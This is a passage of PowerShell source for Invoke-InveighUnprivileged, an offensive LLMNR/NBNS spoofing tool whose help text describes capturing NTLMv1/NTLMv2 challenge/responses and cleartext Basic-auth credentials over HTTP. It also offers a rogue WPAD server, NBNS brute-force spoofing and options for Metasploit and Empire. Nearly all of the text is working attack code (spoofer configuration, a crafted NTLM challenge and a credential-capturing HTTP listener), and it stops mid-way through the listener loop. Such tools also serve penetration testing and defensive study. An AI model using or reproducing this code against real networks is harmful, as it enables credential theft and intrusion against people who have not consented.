function Invoke-InveighUnprivileged
{
<#
.SYNOPSIS
Invoke-InveighUnprivileged is a Windows PowerShell LLMNR/NBNS spoofer with challenge/response capture over HTTP. This
version of Inveigh does not require local admin access.

.DESCRIPTION
Invoke-InveighUnprivileged is a Windows PowerShell LLMNR/NBNS spoofer with the following features:

    Local admin is not required for any feature
    IPv4 NBNS spoofer with granular control that can be run with or without disabling the local NBNS service
    IPv4 LLMNR spoofer with granular control that can be run only with the local LLMNR service disabled
    Targeted IPv4 NBNS transaction ID brute force spoofer with granular control
    NTLMv1/NTLMv2 challenge/response capture over HTTP
    Basic auth cleartext credential capture over HTTP
    WPAD server capable of hosting a basic or custom wpad.dat file
    HTTP server capable of hosting limited content
    Granular control of console and file output
    Run time control

This function contains only features that do not require local admin access. Note that there are caveats. A local
firewall can still prevent traffic from reaching this function's listeners. Also, if LLMNR is enabled on the host,
the LLMNR spoofer will not work. Both of these scenarios would still require local admin access to
change. 

.PARAMETER SpooferIP
IP address for the LLMNR/NBNS spoofing. This parameter is only necessary when redirecting victims to a system
other than the Inveigh host.

.PARAMETER SpooferHostsReply
Default = All: Comma separated list of requested hostnames to respond to when spoofing with LLMNR and NBNS.

.PARAMETER SpooferHostsIgnore
Default = All: Comma separated list of requested hostnames to ignore when spoofing with LLMNR and NBNS.

.PARAMETER SpooferIPsReply
Default = All: Comma separated list of source IP addresses to respond to when spoofing with LLMNR and NBNS.

.PARAMETER SpooferIPsIgnore
Default = All: Comma separated list of source IP addresses to ignore when spoofing with LLMNR and NBNS.

.PARAMETER SpooferRepeat
Default = Enabled: (Y/N) Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user
challenge/response has been captured.

.PARAMETER LLMNR
Default = Enabled: (Y/N) Enable/Disable LLMNR spoofer.

.PARAMETER LLMNRTTL
Default = 30 Seconds: LLMNR TTL in seconds for the response packet.

.PARAMETER NBNS
Default = Disabled: (Y/N) Enable/Disable NBNS spoofer.

.PARAMETER NBNSTTL
Default = 165 Seconds: NBNS TTL in seconds for the response packet.

.PARAMETER NBNSBruteForce
Default = Disabled: (Y/N) Enable/Disable NBNS brute force spoofer.

.PARAMETER NBNSBruteForceHost
Default = WPAD: Hostname for the NBNS Brute Force spoofer.

.PARAMETER NBNSBruteForcePause
Default = Disabled: (Integer) Number of seconds the NBNS brute force spoofer will stop spoofing after an incoming
HTTP request is received.

.PARAMETER NBNSBruteForceTarget
IP address to target for NBNS brute force spoofing. 

.PARAMETER HTTP
Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.

.PARAMETER HTTPIP
Default = Any: IP address for the HTTP listener.

.PARAMETER HTTPPort
Default = 80: TCP port for the HTTP listener.

.PARAMETER HTTPAuth
Default = NTLM: (Anonymous,Basic,NTLM) HTTP/HTTPS server authentication type. This setting does not apply to
wpad.dat requests. Note that Microsoft has changed the behavior of WDAP through NBNS in the June 2016 patches. A
WPAD enabled browser may now trigger NTLM authentication after sending out NBNS requests to random hostnames and
connecting to the root of the HTTP listener.

.PARAMETER HTTPBasicRealm
Realm name for Basic authentication. This parameter applies to both HTTPAuth and WPADAuth.

.PARAMETER HTTPResponse
String or HTML to serve as the default HTTP/HTTPS response. This response will not be used for wpad.dat requests.
Use PowerShell character escapes where necessary.

.PARAMETER WPADAuth
Default = NTLM: (Anonymous,Basic,NTLM) HTTP/HTTPS server authentication type for wpad.dat requests. Setting to
Anonymous can prevent browser login prompts.

.PARAMETER WPADEmptyFile
Default = Enabled: (Y/N) Enable/Disable serving a proxyless, all direct, wpad.dat file for wpad.dat requests.
Enabling this setting can reduce the amount of redundant wpad.dat requests. This parameter is ignored when
using WPADIP, WPADPort, or WPADResponse.

.PARAMETER WPADIP
Proxy server IP to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter must be used
with WPADPort.

.PARAMETER WPADPort
Proxy server port to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter must be
used with WPADIP.

.PARAMETER WPADDirectHosts
Comma separated list of hosts to list as direct in the wpad.dat file. Listed hosts will not be routed through the
defined proxy. Use PowerShell character escapes where necessary.

.PARAMETER WPADResponse
wpad.dat file contents to serve as the wpad.dat response. This parameter will not be used if WPADIP and WPADPort
are set.

.PARAMETER Challenge
Default = Random: 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random
challenge will be generated for each request. This will only be used for non-relay captures.

.PARAMETER MachineAccounts
Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.

.PARAMETER ConsoleOutput
Default = Disabled: (Y/N) Enable/Disable real time console output. If using this option through a shell, test to
ensure that it doesn't hang the shell.

.PARAMETER ConsoleStatus
(Integer) Interval in minutes for displaying all unique captured hashes and credentials. This is useful for
displaying full capture lists when running through a shell that does not have access to the support functions.

.PARAMETER ConsoleUnique
Default = Enabled: (Y/N) Enable/Disable displaying challenge/response hashes for only unique IP, domain/hostname,
and username combinations when real time console output is enabled.

.PARAMETER FileOutput
Default = Disabled: (Y/N) Enable/Disable real time file output.

.PARAMETER FileUnique
Default = Enabled: (Y/N) Enable/Disable outputting challenge/response hashes for only unique IP, domain/hostname,
and username combinations when real time file output is enabled.

.PARAMETER StatusOutput
Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.

.PARAMETER OutputStreamOnly
Default = Disabled: (Y/N) Enable/Disable forcing all output to the standard output stream. This can be helpful if
running Inveigh Unprivileged through a shell that does not return other output streams. Note that you will not see
the various yellow warning messages if enabled.

.PARAMETER OutputDir
Default = Working Directory: Valid path to an output directory for log and capture files. FileOutput must also be
enabled.

.PARAMETER RunTime
Default = Unlimited: (Integer) Run time duration in minutes.

.PARAMETER RunCount
Default = Unlimited: (Integer) Number of captures to perform before auto-exiting.

.PARAMETER StartupChecks
Default = Enabled: (Y/N) Enable/Disable checks for in use ports and running services on startup.

.PARAMETER ShowHelp
Default = Enabled: (Y/N) Enable/Disable the help messages at startup.

.PARAMETER Tool
Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Meterpreter's
PowerShell extension, Metasploit's Interactive PowerShell Sessions payloads and Empire.
0 = None, 1 = Metasploit/Meterpreter, 2 = Empire 

.EXAMPLE
Import-Module .\Inveigh.psd1;Invoke-InveighUnprivileged -ConsoleOutput Y

.EXAMPLE
Invoke-InveighUnprivileged -NBNSBruteForce Y -SpooferTarget 192.168.1.11 -Hostname server1
Target 192.168.1.11 for 'server1' hostname spoofs.

.EXAMPLE
Invoke-InveighUnprivileged -NBNSBruteForce Y -SpooferTarget 192.168.1.11 -WPADIP 192.168.10.10 -WPADPort 8080
Target 192.168.1.11 for 'WPAD' hostname spoofs and respond to wpad.dat requests with a proxy of 192.168.10.10:8080.

.LINK
https://github.com/Kevin-Robertson/Inveigh
#>

# Parameter default values can be modified in this section: 
[CmdletBinding()]
param
(
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTP = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LLMNR = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NBNS = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NBNSBruteForce = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SpooferRepeat = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ConsoleOutput = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ConsoleUnique = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileOutput = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileUnique = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StatusOutput = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$OutputStreamOnly = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$MachineAccounts = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShowHelp = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$WPADEmptyFile = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StartupChecks = "Y",
    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$Tool = "0",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM")][String]$HTTPAuth = "NTLM",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM")][String]$WPADAuth = "NTLM",
    [parameter(Mandatory=$false)][ValidateSet("00","03","20","1B","1C","1D","1E")][Array]$NBNSTypes = @("00","20"),
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$HTTPIP = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$NBNSBruteForceTarget = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$SpooferIP = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$WPADIP = "",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$OutputDir = "",
    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$Challenge = "",
    [parameter(Mandatory=$false)][Array]$SpooferHostsReply = "",
    [parameter(Mandatory=$false)][Array]$SpooferHostsIgnore = "",
    [parameter(Mandatory=$false)][Array]$SpooferIPsReply = "",
    [parameter(Mandatory=$false)][Array]$SpooferIPsIgnore = "",
    [parameter(Mandatory=$false)][Array]$WPADDirectHosts = "",
    [parameter(Mandatory=$false)][Int]$ConsoleStatus = "",
    [parameter(Mandatory=$false)][Int]$HTTPPort = "80",
    [parameter(Mandatory=$false)][Int]$NBNSBruteForcePause = "",
    [parameter(Mandatory=$false)][Int]$LLMNRTTL = "30",
    [parameter(Mandatory=$false)][Int]$NBNSTTL = "165",
    [parameter(Mandatory=$false)][Int]$WPADPort = "",
    [parameter(Mandatory=$false)][Int]$RunCount = "",
    [parameter(Mandatory=$false)][Int]$RunTime = "",
    [parameter(Mandatory=$false)][String]$HTTPBasicRealm = "IIS",
    [parameter(Mandatory=$false)][String]$HTTPResponse = "",
    [parameter(Mandatory=$false)][String]$WPADResponse = "",   
    [parameter(Mandatory=$false)][String]$NBNSBruteForceHost = "WPAD",
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)

if ($invalid_parameter)
{
    throw "$($invalid_parameter) is not a valid parameter."
}

if($inveigh.HTTP -or $inveigh.HTTPS)
{
    throw "You must stop stop other Inveigh HTTP/HTTPS listeners before running this module."
}

if($NBNSBruteForce -eq 'Y')
{
    $NBNS = 'N'
    $LLMNR = 'N'
}

if($NBNSBruteForce -eq 'Y' -and !$NBNSBruteForceTarget)
{
    throw "You must specify a -NBNSBruteForceTarget if enabling -NBNSBruteForce"
}

if(!$SpooferIP)
{
    $SpooferIP = (Test-Connection 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)  
}

if($WPADIP -or $WPADPort)
{

    if(!$WPADIP)
    {
        throw "You must specify a -WPADPort to go with -WPADIP"
    }

    if(!$WPADPort)
    {
        throw "You must specify a -WPADIP to go with -WPADPort"
    }

}

if(!$OutputDir)
{ 
    $output_directory = $PWD.Path
}
else
{
    $output_directory = $OutputDir
}

if(!$inveigh)
{
    $global:inveigh = [HashTable]::Synchronized(@{})
    $inveigh.log = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_username_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_username_list = New-Object System.Collections.ArrayList
    $inveigh.cleartext_list = New-Object System.Collections.ArrayList
    $inveigh.IP_capture_list = New-Object System.Collections.ArrayList
    $inveigh.SMBRelay_failed_list = New-Object System.Collections.ArrayList
    $inveigh.valid_host_list = New-Object System.Collections.ArrayList
}

if($inveigh.unprivileged_running)
{
    throw "Invoke-InveighUnprivileged is already running, use Stop-Inveigh"
}

if(!$inveigh.running -or !$inveigh.relay_running)
{
    $inveigh.console_queue = New-Object System.Collections.ArrayList
    $inveigh.status_queue = New-Object System.Collections.ArrayList
    $inveigh.log_file_queue = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_file_queue = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList
    $inveigh.cleartext_file_queue = New-Object System.Collections.ArrayList
    $inveigh.HTTP_challenge_queue = New-Object System.Collections.ArrayList
    $inveigh.certificate_application_ID = $HTTPSCertAppID
    $inveigh.certificate_thumbprint = $HTTPSCertThumbprint
    $inveigh.console_output = $false
    $inveigh.console_input = $true
    $inveigh.file_output = $false
    $inveigh.log_out_file = $output_directory + "\Inveigh-Log.txt"
    $inveigh.NTLMv1_out_file = $output_directory + "\Inveigh-NTLMv1.txt"
    $inveigh.NTLMv2_out_file = $output_directory + "\Inveigh-NTLMv2.txt"
    $inveigh.cleartext_out_file = $output_directory + "\Inveigh-Cleartext.txt"
}

$inveigh.hostname_spoof = $false
$inveigh.unprivileged_running = $true

if($StatusOutput -eq 'Y')
{
    $inveigh.status_output = $true
}
else
{
    $inveigh.status_output = $false
}

if($OutputStreamOnly -eq 'Y')
{
    $inveigh.output_stream_only = $true
}
else
{
    $inveigh.output_stream_only = $false
}

if($Tool -eq 1) # Metasploit Interactive PowerShell Payloads and Meterpreter's PowerShell Extension
{
    $inveigh.tool = 1
    $inveigh.output_stream_only = $true
    $inveigh.newline = ""
    $ConsoleOutput = "N"
}
elseif($Tool -eq 2) # PowerShell Empire
{
    $inveigh.tool = 2
    $inveigh.output_stream_only = $true
    $inveigh.console_input = $false
    $inveigh.newline = "`n"
    $ConsoleOutput = "Y"
    $ShowHelp = "N"
}
else
{
    $inveigh.tool = 0
    $inveigh.newline = ""
}

# Write startup messages
$inveigh.status_queue.Add("Inveigh Unprivileged started at $(Get-Date -format 's')") > $null
$inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh Unprivileged started")])  > $null

if($StartupChecks -eq 'Y')
{
    $firewall_status = netsh advfirewall show allprofiles state | Where-Object {$_ -match 'ON'}
}

if($firewall_status)
{
    $inveigh.status_queue.Add("Windows Firewall = Enabled")  > $null

    $firewall_rules = New-Object -comObject HNetCfg.FwPolicy2
    $firewall_powershell = $firewall_rules.rules | Where-Object {$_.Enabled -eq $true -and $_.Direction -eq 1} |Select-Object -Property Name | Select-String "Windows PowerShell}"

    if($firewall_powershell)
    {
        $inveigh.status_queue.Add("Windows Firewall - PowerShell.exe = Allowed")  > $null
    }

}

if($LLMNR -eq 'Y')
{
    if($StartupChecks -eq 'Y')
    {
        $LLMNR_port_check = netstat -anp UDP | findstr /C:"0.0.0.0:5355 "
    }

    if(!$LLMNR_port_check)
    {
        $inveigh.status_queue.Add("LLMNR Spoofer = Enabled")  > $null
        $inveigh.status_queue.Add("LLMNR TTL = $LLMNRTTL Seconds")  > $null
        $LLMNR_response_message = "- response sent"
    }
    else
    {
        $LLMNR = "N"
        $inveigh.status_queue.Add("LLMNR Spoofer Disabled Due To In Use Port 5355")  > $null
    }
}
else
{
    $inveigh.status_queue.Add("LLMNR Spoofer = Disabled")  > $null
    $LLMNR_response_message = "- LLMNR spoofer is disabled"
}

if($NBNS -eq 'Y')
{
    $NBNSTypes_output = $NBNSTypes -join ","
    
    if($NBNSTypes.Count -eq 1)
    {
        $inveigh.status_queue.Add("NBNS Spoofer For Type $NBNSTypes_output = Enabled")  > $null
    }
    else
    {
        $inveigh.status_queue.Add("NBNS Spoofer For Types $NBNSTypes_output = Enabled")  > $null
    }

    $NBNS_response_message = "- response sent"
}
else
{
    $inveigh.status_queue.Add("NBNS Spoofer = Disabled")  > $null
    $NBNS_response_message = "- NBNS spoofer is disabled"
}

if($NBNSBruteForce -eq 'Y')
{   
    $inveigh.status_queue.Add("NBNS Brute Force Spoofer Target = $NBNSBruteForceTarget") > $null
    $inveigh.status_queue.Add("NBNS Brute Force Spoofer IP Address = $SpooferIP") > $null
    $inveigh.status_queue.Add("NBNS Brute Force Spoofer Hostname = $NBNSBruteForceHost") > $null

    if($NBNSBruteForcePause)
    {
        $inveigh.status_queue.Add("NBNS Brute Force Pause = $NBNSBruteForcePause Seconds") > $null
    }

}
else
{
    $inveigh.status_queue.Add("NBNS Brute Force Spoofer = Disabled") > $null
}

if($NBNS -eq 'Y' -or $NBNSBruteForce -eq 'Y')
{
    $inveigh.status_queue.Add("NBNS TTL = $NBNSTTL Seconds") > $null
}

if($SpooferHostsReply -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $inveigh.status_queue.Add("Spoofer Hosts Reply = " + ($SpooferHostsReply -join ","))  > $null
}

if($SpooferHostsIgnore -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $inveigh.status_queue.Add("Spoofer Hosts Ignore = " + ($SpooferHostsIgnore -join ","))  > $null
}

if($SpooferIPsReply -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $inveigh.status_queue.Add("Spoofer Ips Reply = " + ($SpooferIPsReply -join ",")) > $null
}

if($SpooferIPsIgnore -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $inveigh.status_queue.Add("Spoofer IPs Ignore = " + ($SpooferIPsIgnore -join ","))  > $null
}

if($SpooferRepeat -eq 'N')
{
    $inveigh.spoofer_repeat = $false
    $inveigh.status_queue.Add("Spoofer Repeating = Disabled")  > $null
}
else
{
    $inveigh.spoofer_repeat = $true
}

if($HTTP -eq 'Y')
{
    
    if($StartupChecks -eq 'Y')
    {
        $HTTP_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"0.0.0.0:$HTTPPort "
    }
    elseif($HTTPIP -and $StartupChecks -eq 'Y')
    {
        $HTTP_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$HTTPPort "
    }

    if($HTTP_port_check)
    {
        $HTTP = "N"
        $inveigh.status_queue.Add("HTTP Capture Disabled Due To In Use Port $HTTPPort")  > $null
    }
    else
    {

        if($HTTPIP)
        {
            $inveigh.status_queue.Add("HTTP IP Address = $HTTPIP") > $null
        }

        if($HTTPPort -ne 80)
        {
            $inveigh.status_queue.Add("HTTP Port = $HTTPPort") > $null
        }

        $inveigh.status_queue.Add("HTTP Capture = Enabled") > $null
        $inveigh.status_queue.Add("HTTP Authentication = $HTTPAuth") > $null
        $inveigh.status_queue.Add("WPAD Authentication = $WPADAuth") > $null

        if($HTTPResponse)
        {
            $inveigh.status_queue.Add("HTTP Custom Response = Enabled") > $null
        }

        if($HTTPAuth -eq 'Basic' -or $WPADAuth -eq 'Basic')
        {
            $inveigh.status_queue.Add("Basic Authentication Realm = $HTTPBasicRealm") > $null
        }

        if($WPADIP -and $WPADPort)
        {
            $inveigh.status_queue.Add("WPAD = $WPADIP`:$WPADPort") > $null

            if($WPADDirectHosts)
            {
                $inveigh.status_queue.Add("WPAD Direct Hosts = " + $WPADDirectHosts -join ",") > $null
            }

        }
        elseif($WPADResponse -and !$WPADIP -and !$WPADPort)
        {
            $inveigh.status_queue.Add("WPAD Custom Response = Enabled") > $null
        }
        elseif($WPADEmptyFile -eq 'Y')
        {
            $inveigh.status_queue.Add("WPAD Default Response = Enabled")  > $null
        }

        if($Challenge)
        {
            $inveigh.status_queue.Add("NTLM Challenge = $Challenge") > $null
        }

        if($MachineAccounts -eq 'n')
        {
            $inveigh.status_queue.Add("Machine Account Capture = Disabled") > $null
            $inveigh.machine_accounts = $false
        }
        else
        {
            $inveigh.machine_accounts = $true
        }

    }

}
else
{
    $inveigh.status_queue.Add("HTTP Capture = Disabled") > $null
}

if($ConsoleOutput -eq 'Y')
{
    $inveigh.status_queue.Add("Real Time Console Output = Enabled") > $null
    $inveigh.console_output = $true

    if($ConsoleStatus -eq 1)
    {
        $inveigh.status_queue.Add("Console Status = $ConsoleStatus Minute")  > $null
    }
    elseif($ConsoleStatus -gt 1)
    {
        $inveigh.status_queue.Add("Console Status = $ConsoleStatus Minutes")  > $null
    }

}
else
{

    if($inveigh.tool -eq 1)
    {
        $inveigh.status_queue.Add("Real Time Console Output Disabled Due To External Tool Selection") > $null
    }
    else
    {
        $inveigh.status_queue.Add("Real Time Console Output = Disabled") > $null
    }

}

if($ConsoleUnique -eq 'Y')
{
    $inveigh.console_unique = $true
}
else
{
    $inveigh.console_unique = $false
}

if($FileOutput -eq 'Y')
{
    $inveigh.status_queue.Add("Real Time File Output = Enabled") > $null
    $inveigh.status_queue.Add("Output Directory = $output_directory") > $null
    $inveigh.file_output = $true
}
else
{
    $inveigh.status_queue.Add("Real Time File Output = Disabled") > $null
}

if($FileUnique -eq 'Y')
{
    $inveigh.file_unique = $true
}
else
{
    $inveigh.file_unique = $false
}

if($RunTime -eq 1)
{
    $inveigh.status_queue.Add("Run Time = $RunTime Minute") > $null
}
elseif($RunTime -gt 1)
{
    $inveigh.status_queue.Add("Run Time = $RunTime Minutes") > $null
}

if($RunCount)
{
    $inveigh.status_queue.Add("Run Count = $RunCount") > $null
}

if($ShowHelp -eq 'Y')
{
    $inveigh.status_queue.Add("Run Stop-Inveigh to stop Inveigh-Unprivileged") > $null
        
    if($inveigh.console_output)
    {
        $inveigh.status_queue.Add("Press any key to stop real time console output") > $null
    }

}

if($inveigh.status_output)
{

    while($inveigh.status_queue.Count -gt 0)
    {

        if($inveigh.output_stream_only)
        {
            Write-Output($inveigh.status_queue[0] + $inveigh.newline)
            $inveigh.status_queue.RemoveAt(0)
        }
        else
        {

            switch -Wildcard ($inveigh.status_queue[0])
            {

                "* Disabled Due To *"
                {
                    Write-Warning($inveigh.status_queue[0])
                    $inveigh.status_queue.RemoveAt(0)
                }

                "Run Stop-Inveigh to stop Inveigh-Unprivileged"
                {
                    Write-Warning($inveigh.status_queue[0])
                    $inveigh.status_queue.RemoveAt(0)
                }

                "Windows Firewall = Enabled"
                {
                    Write-Warning($inveigh.status_queue[0])
                    $inveigh.status_queue.RemoveAt(0)
                }

                default
                {
                    Write-Output($inveigh.status_queue[0])
                    $inveigh.status_queue.RemoveAt(0)
                }

            }

        }

    }

}

# Begin ScriptBlocks

# Shared Basic functions ScriptBlock
$shared_basic_functions_scriptblock =
{

    function DataLength2
    {
        param ([Int]$length_start,[Byte[]]$string_extract_data)

        $string_length = [System.BitConverter]::ToUInt16($string_extract_data[$length_start..($length_start + 1)],0)
        return $string_length
    }

    function DataLength4
    {
        param ([Int]$length_start,[Byte[]]$string_extract_data)

        $string_length = [System.BitConverter]::ToUInt32($string_extract_data[$length_start..($length_start + 3)],0)
        return $string_length
    }

    function DataToString
    {
        param ([Int]$string_start,[Int]$string_length,[Byte[]]$string_extract_data)

        $string_data = [System.BitConverter]::ToString($string_extract_data[$string_start..($string_start + $string_length - 1)])
        $string_data = $string_data -replace "-00",""
        $string_data = $string_data.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
        return $string_extract
    }

}

# HTTP Server ScriptBlock - HTTP listener
$HTTP_scriptblock = 
{ 
    param ($Challenge,$HTTPAuth,$HTTPBasicRealm,$HTTPIP,$HTTPPort,$HTTPResponse,$NBNSBruteForcePause,$WPADAuth,$WPADEmptyFile,$WPADIP,$WPADPort,$WPADDirectHosts,$WPADResponse,$RunCount)

    function NTLMChallengeBase64
    {
        param ([String]$Challenge)

        $HTTP_timestamp = Get-Date
        $HTTP_timestamp = $HTTP_timestamp.ToFileTime()
        $HTTP_timestamp = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_timestamp))
        $HTTP_timestamp = $HTTP_timestamp.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

        if($Challenge)
        {
            $HTTP_challenge = $Challenge
            $HTTP_challenge_bytes = $HTTP_challenge.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        else
        {
            $HTTP_challenge_bytes = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $HTTP_challenge = $HTTP_challenge_bytes -replace ' ', ''
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }

        $inveigh.HTTP_challenge_queue.Add($HTTP_client.Client.RemoteEndpoint.Address.IPAddressToString + $HTTP_client.Client.RemoteEndpoint.Port + ',' + $HTTP_challenge)  > $null

        $HTTP_NTLM_bytes = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,
                            0x00,0x00,0x00,0x05,0x82,0x89,0xa2 +
                            $HTTP_challenge_bytes +
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,
                            0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00,0x02,0x00,0x06,0x00,
                            0x4c,0x00,0x41,0x00,0x42,0x00,0x01,0x00,0x10,0x00,0x48,0x00,0x4f,0x00,0x53,0x00,0x54,
                            0x00,0x4e,0x00,0x41,0x00,0x4d,0x00,0x45,0x00,0x04,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,
                            0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x03,0x00,0x24,
                            0x00,0x68,0x00,0x6f,0x00,0x73,0x00,0x74,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,
                            0x2e,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,
                            0x00,0x6c,0x00,0x05,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,
                            0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x07,0x00,0x08,0x00 +
                            $HTTP_timestamp +
                            0x00,0x00,0x00,0x00,0x0a,0x0a

        $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
        $NTLM = "NTLM " + $NTLM_challenge_base64
        $NTLM_challenge = $HTTP_challenge
        
        return $NTLM
    }

    if($HTTPIP)
    {
        $HTTPIP = [System.Net.IPAddress]::Parse($HTTPIP)
        $HTTP_endpoint = New-Object System.Net.IPEndPoint($HTTPIP,$HTTPPort)
    }
    else
    {
        $HTTP_endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::any,$HTTPPort)
    }

    $HTTP_running = $true
    $HTTP_listener = New-Object System.Net.Sockets.TcpListener $HTTP_endpoint
    
    try
    {
        $HTTP_listener.Start()
    }
    catch
    {
        $inveigh.console_queue.Add("$(Get-Date -format 's') - Error starting HTTP listener")
        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Error starting HTTP listener")])
        $HTTP_running = $false
    }

    $HTTP_WWW_authenticate_header = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20 # WWW-Authenticate
    $run_count_NTLMv1 = $RunCount + $inveigh.NTLMv1_list.Count
    $run_count_NTLMv2 = $RunCount + $inveigh.NTLMv2_list.Count
    $run_count_cleartext = $RunCount + $inveigh.cleartext_list.Count

    if($WPADIP -and $WPADPort)
    {

        if($WPADDirectHosts)
        {

            foreach($WPAD_direct_host in $WPADDirectHosts)
            {
                $WPAD_direct_hosts_function += 'if (dnsDomainIs(host, "' + $WPAD_direct_host + '")) return "DIRECT";'
            }

            $HTTP_WPAD_response = "function FindProxyForURL(url,host){" + $WPAD_direct_hosts_function + "return `"PROXY " + $WPADIP + ":" + $WPADPort + "`";}"
        }
        else
        {
            $HTTP_WPAD_response = "function FindProxyForURL(url,host){return `"PROXY " + $WPADIP + ":" + $WPADPort + "`";}"
        }

    }
    elseif($WPADResponse)
    {
        $HTTP_WPAD_response = $WPADResponse
    }
    elseif($WPADEmptyFile -eq 'Y')
    {
        $HTTP_WPAD_response = "function FindProxyForURL(url,host){return `"DIRECT`";}"
    }

    $HTTP_client_close = $true

    :HTTP_listener_loop while ($inveigh.unprivileged_running -and $HTTP_running)
    {
        $TCP_request = ""
        $TCP_request_bytes = New-Object System.Byte[] 1024

        while(!$HTTP_listener.Pending() -and !$HTTP_client.Connected)
        {

            Start-Sleep -m 10

            if(!$inveigh.unprivileged_running)
            {
                break HTTP_listener_loop
            }
        
        }

        if(!$HTTP_client.Connected -or $HTTP_client_close -and $inveigh.unprivileged_running)
        {
            $HTTP_client = $HTTP_listener.AcceptTcpClient() # will block here until connection 
	        $HTTP_stream = $HTTP_client.GetStream()
        }

        $HTTP_stream_timeout = New-TimeSpan -Seconds 2
        $HTTP_stream_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()

        while($HTTP_stream.DataAvailable -and $HTTP_stream_stopwatch.Elapsed -lt $HTTP_stream_timeout)
        {
            $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length)
        }

        $TCP_request = [System.BitConverter]::ToString($TCP_request_bytes)

        if($TCP_request -like "47-45-54-20*" -or $TCP_request -like "48-45-41-44-20*" -or $TCP_request -like "4f-50-54-49-4f-4e-53-20*")
        {
